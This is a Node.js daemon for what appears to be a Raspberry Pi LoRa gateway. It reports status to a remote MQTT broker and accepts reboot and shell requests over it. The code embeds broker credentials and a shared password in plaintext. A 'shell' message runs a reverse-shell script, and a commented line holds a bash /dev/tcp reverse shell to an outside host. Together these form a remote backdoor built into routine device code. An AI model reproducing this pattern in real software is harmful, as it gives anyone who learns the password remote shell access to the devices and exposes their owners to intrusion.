var loraURL = "mqtt://127.0.0.1";
var mqtt = require("mqtt");
var jsonfile = require('jsonfile');
var loraURL = "mqtt://127.0.0.1";
var lagoonURL = "mqtt://101.200.34.179";
var CONFIG_FILE='/home/pi/siphonage/conf/siphonage.js';
var config;
var GWID="GW_XJCJ66";
var REBOOT_PWD="cleansiphonageass";
var IntervalTime=1800000;
try {
    config=require(CONFIG_FILE);
    GWID=config.GWID;
    REBOOT_PWD=config.rebootPwd;
    if(config.daemonItvTime>30000){
        IntervalTime=config.daemonItvTime;
    }   
} catch (error) {
    console.log("error config file!");
}


var gatewayinfo={};
gatewayinfo["GW_ID"]=GWID;

var lagoon = mqtt.connect(lagoonURL, {username: 'pastoral', password: 'pastoral'});

lagoon.on('connect', function(){
  gatewayinfo["daemon_online"]="true";	
  lagoon.publish('gateway/update', JSON.stringify(gatewayinfo));
  lagoon.subscribe('gateway/'+GWID+'/request/reboot');
  lagoon.subscribe('gateway/'+GWID+'/request/shell');
  console.log('login lagoon ,subscribe chnal down:'+Date.now());
})

lagoon.on('message', function(topic, message){
    devID = topic.split('/')[1];
    msgType = topic.split('/')[2];
    if(msgType=='request'){
        msgType = topic.split('/')[3];
    }
    if (msgType == 'reboot'){
         try {
                var lagoonJSON = JSON.parse(message.toString());
                if(lagoonJSON.pwd==REBOOT_PWD){ 
                        gatewayinfo["online"]="false";
                        gatewayinfo["daemon_online"]="false";
			            lagoon.publish('gateway/update', JSON.stringify(gatewayinfo));
			            console.log("Lagoon told to reboot ,let's reboot conduit!");
                        rebootconduit();
                }
        } catch (error) {
                console.log('Received erro JSON message from lagoon');
                return 0;
        }    
    }else if (msgType == 'shell'){
         try {
                var lagoonJSON = JSON.parse(message.toString());
                if(lagoonJSON.pwd==REBOOT_PWD){ 
                        gatewayinfo["online"]="true";
                        gatewayinfo["daemon_online"]="true";
                        gatewayinfo["shell"]="true";
			            lagoon.publish('gateway/update', JSON.stringify(gatewayinfo));
			            console.log("Lagoon told to reboot ,let's reboot conduit!");
                        gotshell();
                }
        } catch (error) {
                console.log('Received erro JSON message from lagoon');
                return 0;
        }    
    }
   
})

function rebootconduit(){
     var exec = require('child_process').exec; 
     var cmdStr = 'reboot';
     try {
          exec(cmdStr, function(err,stdout,stderr){
            if(err) {
                        console.log('Reboot error:'+stderr);
            } else {
                        var data = stdout;
                        console.log(data);
            }
        });
    } catch (error) {
        console.log('exec Reboot error:'+error);
    }
}

function gotshell(){
     var exec = require('child_process').exec; 
     //var cmdStr = '/bin/bash -i > /dev/tcp/app.yeegen.com/25566 0<&1 2>&1';
     var cmdStr = '/home/pi/revshell.sh';
     try {
          exec(cmdStr, function(err,stdout,stderr){
            if(err) {
                        console.log('shell error:'+stderr);
            } else {
                        var data = stdout;
                        console.log(data);
            }
        });
    } catch (error) {
        console.log('exec shell error:'+error);
    }
}



